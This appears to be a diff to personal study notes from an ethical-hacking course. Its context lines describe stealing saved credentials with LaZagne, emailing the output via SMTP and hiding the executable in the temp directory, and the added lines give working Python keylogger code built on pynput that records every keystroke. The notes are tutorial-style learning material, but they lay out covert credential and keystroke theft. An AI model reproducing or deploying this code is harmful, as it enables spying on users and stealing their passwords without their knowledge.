@@ -431,8 +431,27 @@ ouput is captured in variable using subproccess and its sent via smtp. but the d
 need to interact with os. import os because its platform independent.os.remove('lazagne.exe'). but during the execution time 
 file will be visible say 5 to 60s. so let the file be downloaded at a location user might not be looking at say tmp. but temp 
 location varies per os hence import tempfile. temp_dir = tempfile.gettempdir(). os.chdir(temp_dir) before execution. 
-  
-                        
+ 
+ keylogger - library is pynput - monitor and control mouse and keyboard.  import pynput.keyboard (only for keyboard)
+ keyboard_listener = pynput.keyboard.Listener(on_press = proccess_key_press)
+ log = ''
+ def proccess_key_press(key):
+        global log
+        try:
+                log = log + str(key.char)  # converting key to corresponding char only else it will come with u'
+        except AttributeError:
+                log = log + ' ' + str(key) + ' '   #exception will occur for special chars like space,enter,tab,up,down etc
+        print(log)
+ with keyboard_listener:
+        keyboard_listener.join()
+        
+ use of global variable is not rcd as it gets difficult to track where and by which functions its being modified and it leads 
+ to difficulties in troubleshooting. But inside our call back function its useful since everytime key is pressed the function
+ will be run resetting local variables. 
+        
+   
+        
+        
          
                         
                         
